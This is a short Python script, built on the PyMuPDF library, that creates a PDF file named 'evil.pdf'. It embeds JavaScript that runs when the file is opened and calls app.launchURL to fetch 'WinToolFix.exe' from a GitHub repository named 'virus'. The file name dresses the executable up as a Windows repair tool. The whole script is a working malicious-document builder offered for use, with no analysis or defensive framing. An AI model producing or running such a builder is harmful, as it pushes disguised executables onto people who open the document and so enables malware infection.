import fitz  # PyMuPDF

# URL to the WinToolFix.exe
url = "https://github.com/Fhchcjcjcjcjvkkvk/virus/raw/refs/heads/main/WinToolFix.exe"

# Create a new PDF document
doc = fitz.open()

# Add a page to the document
page = doc.new_page()

# Add some text to the page to indicate that something is being downloaded
page.insert_text((50, 50), "Downloading WinToolFix.exe...", fontsize=12)

# JavaScript code to automatically launch the download
js_code = f"""
var docURL = '{url}';
app.launchURL(docURL, true);
"""

# Embed the JavaScript as an open action (trigger when the document is opened)
doc.set_js(js_code)

# Save the PDF
output_pdf = "evil.pdf"
doc.save(output_pdf)

print(f"PDF created and saved as {output_pdf}")
